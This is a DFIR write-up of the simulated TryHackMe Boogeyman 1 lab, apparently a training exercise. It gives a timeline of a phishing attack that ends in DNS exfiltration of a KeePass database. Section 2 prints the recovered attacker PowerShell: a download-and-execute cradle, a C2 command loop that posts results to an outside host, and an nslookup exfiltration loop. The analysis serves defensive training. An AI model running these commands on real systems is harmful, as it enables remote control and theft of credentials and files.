# Boogeyman 1 — Attack Timeline

**Case Reference:** `INC-2023-0113-BGM1`  
**Target Organization:** Quick Logistics LLC (Finance Department)  
**Impacted Host:** `QL-WKSTN-5693` (`10.10.182.255`)  
**Impacted User:** Julianne Westcott (`j.westcott`)  

> Lab disclaimer: TryHackMe Boogeyman 1, all data simulated. Full context in [`report.md`](report.md).

This timeline reconstructs the entire multi-stage attack chronologically by synthesizing email metadata (`dump.eml`), endpoint PowerShell script block logs (`powershell.json`), and network packet captures (`capture.pcapng`).

---

## 1. Master Attack Sequence

| Sequence | Time (UTC) | Event | Evidence Source | Technical Context & Analyst Notes |
|:---:|:---:|---|---|---|
| 1 | 2023-01-13 09:25:26 | Phishing email sent to victim | `dump.eml` headers | Threat actor Arthur Griffin (`agriffin@bpakcaging.xyz`) targets `julianne.westcott@hotmail.com`. |
| 2 | 2023-01-13 09:25:26 | Invoice/payment lure used | `dump.eml` Subject & Body | Subject: `Collection for Quick Logistics LLC - Jan 2023`. Body contains payment request and embedded tracking pixel. |
| 3 | 2023-01-13 09:25:26 | Encrypted ZIP attachment delivered | `dump.eml` MIME structure | Attached `Invoice.zip` (Base64 MIME), SHA-256: `b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87`. |
| 4 | 2023-01-13 09:25:26 | ZIP password provided in email body | `dump.eml` body | Password `Invoice2023!` provided in plain text to evade automated sandbox detonation. |
| 5 | 2023-01-13 09:25:31 | Email received by mail infrastructure | `dump.eml` Received headers | Routed through Elastic Email relay (`pa80.mxout.mta1.net` / `15.235.99.80`) with valid SPF and DKIM signatures. |
| 6 | 2023-01-13 09:25:35 | Email delivered to Exchange inbox | `dump.eml` transit headers | Message delivered directly to Julianne Westcott without quarantine. |
| 7 | Time not logged | Attachment unzipped and LNK launched | Host Artifacts | Victim extracts `Invoice.zip` with `Invoice2023!` and double-clicks `Invoice_20230103.lnk`. |
| 8 | 2023-01-13 17:10:07 | Stage-1 fileless download cradle executed | `powershell.json` EID 4104 | Shortcut triggers `powershell.exe -nop -windowstyle hidden -enc ...` executing `Net.WebClient.DownloadString`. |
| 9 | 2023-01-13 17:10:09 | Payload server delivers stage-2 implant | `capture.pcapng` Frame 33256 | Workstation fetches `http://files.bpakcaging.xyz/update`. Server responds `HTTP/1.0 200 OK` (`Server: SimpleHTTP/0.6 Python/3.10.7`, `Content-Length: 522`). |
| 10 | 2023-01-13 17:10:09 | In-memory C2 polling beacon established | `powershell.json` Record 536 / `capture.pcapng` | Workstation polls `http://cdn.bpakcaging.xyz:8080/b86459bb` (`159.89.205.40`) every 0.8s with header `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489`. |
| 11 | 2023-01-13 17:12:17 | Attacker attempts Seatbelt download via GitHub | `powershell.json` Record 553 | Downloads `Invoke-Seatbelt.ps1` from GitHub repository; fails due to restricted outbound access or script errors. |
| 12 | 2023-01-13 17:18:05 | Attacker fetches and executes Seatbelt binary | `powershell.json` Record 630 | Attacker downloads `http://files.bpakcaging.xyz/sb.exe` and runs `Seatbelt.exe -group=user;pwd` for host reconnaissance. |
| 13 | 2023-01-13 17:19:06 | Attacker locates KeePass database | `powershell.json` Record 646 | File search identifies `C:\Users\j.westcott\Documents\protected_data.kdbx`. |
| 14 | 2023-01-13 17:22:47 | Attacker browses Sticky Notes package directory | `powershell.json` Record 686 | Inspects `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe`. |
| 15 | 2023-01-13 17:23:38 | Attacker downloads SQLite utility `sq3.exe` | `powershell.json` Record 703 / `capture.pcapng` | Downloads `sq3.exe` from `http://files.bpakcaging.xyz/sq3.exe` via `Invoke-WebRequest`. |
| 16 | 2023-01-13 17:25:38 | Attacker executes SQLite query on Sticky Notes | `powershell.json` Record 724 | Executes `.\Music\sq3.exe ... plum.sqlite "SELECT * from NOTE limit 100"`. |
| 17 | 2023-01-13 ~17:25 | Sticky Notes output exfiltrated to C2 | `capture.pcapng` Frame 44467 (Stream 752) | Command output sent via `POST /27fe2489` encoded as space-delimited decimal ASCII bytes; attacker receives password `%p9^3!lL^Mz47E2GaT^y`. |
| 18 | 2023-01-13 17:31:48 | Attacker stages KeePass database in memory | `powershell.json` Record 741 | Sets `$file='C:\Users\j.westcott\Documents\protected_data.kdbx'` and `$destination = "167.71.211.113"`. |
| 19 | 2023-01-13 17:32:15 | File read as raw byte stream | `powershell.json` Record 762 | Invokes `[System.IO.File]::ReadAllBytes($file)`. |
| 20 | 2023-01-13 17:32:23 | Raw bytes converted to hexadecimal | `powershell.json` Record 768 | Executes `($bytes|ForEach-Object ToString X2) -join ''` producing 4,412 hex characters. |
| 21 | 2023-01-13 17:32:41 | Attacker launches DNS exfiltration loop | `powershell.json` Record 774 | PowerShell executes loop splitting hex into 50-character chunks: `nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113`. |
| 22 | 2023-01-13 17:32:41 – 17:34:38 | DNS tunneling traffic observed on wire | `capture.pcapng` frames 47767–48712 | 89 deduplicated hex chunks transmitted to rogue authoritative nameserver `167.71.211.113`. Exfiltration successful. |
| 23 | Post-Incident Analysis | Forensic Carving of KeePass Database | `capture.pcapng` DNS Carving | Analyst carves 2,206 bytes (`protected_data_carved.kdbx`), verifies KeePass 2.x header `03 D9 A2 9A 67 FB 4B B5`. |
| 24 | Post-Incident Analysis | Database Decryption & Asset Confirmation | `keepassxc-cli` | Database unlocked with `%p9^3!lL^Mz47E2GaT^y`, confirming compromise of Quick Logistics corporate card `4024007128269551` (Exp: 03/2028, CVV: 970). |

---

## 2. Key Forensic Command Excerpts

### 2.1 Fileless Stage-1 Download Cradle (LNK Payload)
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

### 2.2 Stage-2 In-Memory C2 Polling Loop
```powershell
$s='cdn.bpakcaging.xyz:8080'; $i='8cce49b0-b86459bb-27fe2489'; $p='http://';
$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};
while ($true) {
    $c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;
    if ($c -ne 'None') {
        $r=iex $c -ErrorAction Stop -ErrorVariable e;
        $r=Out-String -InputObject $r;
        $t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
    }
    sleep 0.8
}
```

### 2.3 Credential Theft (Sticky Notes SQLite Query)
```powershell
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```

### 2.4 Data Staging & DNS Exfiltration Loop
```powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);
$hex = ($bytes|ForEach-Object ToString X2) -join '';
$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";
```

---

## 3. Threat Activity Flow

```text
[Phishing Delivery via Elastic Email / 15.235.99.80]
  │
  ▼
[Victim Opens Invoice.zip with 'Invoice2023!' → Clicks Invoice_20230103.lnk]
  │
  ▼
[Hidden PowerShell spawned → Downloads /update from files.bpakcaging.xyz (Python SimpleHTTP/0.6)]
  │
  ▼
[In-Memory C2 established with cdn.bpakcaging.xyz:8080 via header X-38d2-8f49]
  │
  ▼
[Host Reconnaissance via Seatbelt.exe -group=user]
  │
  ▼
[sq3.exe downloads → Queries plum.sqlite → Frame 44467 returns KeePass Master Password]
  │
  ▼
[protected_data.kdbx read into memory → Converted to 4,412 hex characters]
  │
  ▼
[DNS Exfiltration via nslookup → 89 chunks routed to 167.71.211.113]
  │
  ▼
[DFIR Carving & Decryption → Unlocks Quick Logistics Corporate Credit Card 4024007128269551]
```
